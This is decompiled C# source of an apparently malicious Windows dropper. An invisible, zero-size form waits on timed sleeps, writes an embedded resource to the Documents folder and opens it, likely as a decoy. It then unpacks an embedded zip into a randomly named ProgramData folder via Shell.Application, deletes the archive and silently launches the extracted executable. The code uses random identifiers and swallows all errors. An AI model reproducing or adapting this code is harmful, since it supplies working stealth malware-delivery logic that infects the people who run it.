using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using rifhadhsva.My.Resources;

namespace rifhadhsva;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	private string appName;

	private string appPath;

	public string apppath => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + appPath;

	public string zippath => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + appPath + "zip\\";

	public Form1()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		__ENCAddToList(this);
		appName = "rnthiavesa".ToString();
		appPath = "\\Hanthavra\\".ToString();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public void load_file(string fileName)
	{
		try
		{
			Process.Start(fileName);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void dbsrualbmloadMe()
	{
		try
		{
			Thread.Sleep(11);
			string text = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()) + "-03".ToString();
			rifhadhsva rifhadhsva2 = new rifhadhsva();
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\".ToString();
			string text3 = text2 + text + "-" + rifhadhsva2.file_Ext.ToString();
			if (!File.Exists(text3) && Resources.rifhadhsva.Length > 105)
			{
				File.WriteAllBytes(text3, Resources.rifhadhsva);
			}
			if (File.Exists(text3))
			{
				load_file(text3);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void UnZip()
	{
		try
		{
			string text = apppath;
			string text2 = zippath;
			Class1 @class = new Class1();
			byte[] wind = @class.getWind();
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			string text3 = text2 + appName;
			File.WriteAllBytes(text3, wind);
			string text4 = text2 + "vatdram.zip".ToString();
			if (!File.Exists(text4))
			{
				File.Move(text3, text4);
			}
			string text5 = text + appName + ".exe".ToString();
			if (!File.Exists(text5))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(Type.GetTypeFromProgID("Shell.Application")));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "NameSpace", new object[1] { text }, (string[])null, (Type[])null, (bool[])null));
				object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "NameSpace", new object[1] { text4 }, (string[])null, (Type[])null, (bool[])null));
				NewLateBinding.LateCall(objectValue2, (Type)null, "CopyHere", new object[2]
				{
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null)),
					4
				}, (string[])null, (Type[])null, (bool[])null, true);
			}
			try
			{
				if (File.Exists(text4))
				{
					File.Delete(text4);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Process.Start(text5);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Thread.Sleep(1010);
		dbsrualbmloadMe();
		Thread.Sleep(2001);
		UnZip();
		Thread.Sleep(2001);
		try
		{
			((Form)this).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Thread.Sleep(2001);
	}
}
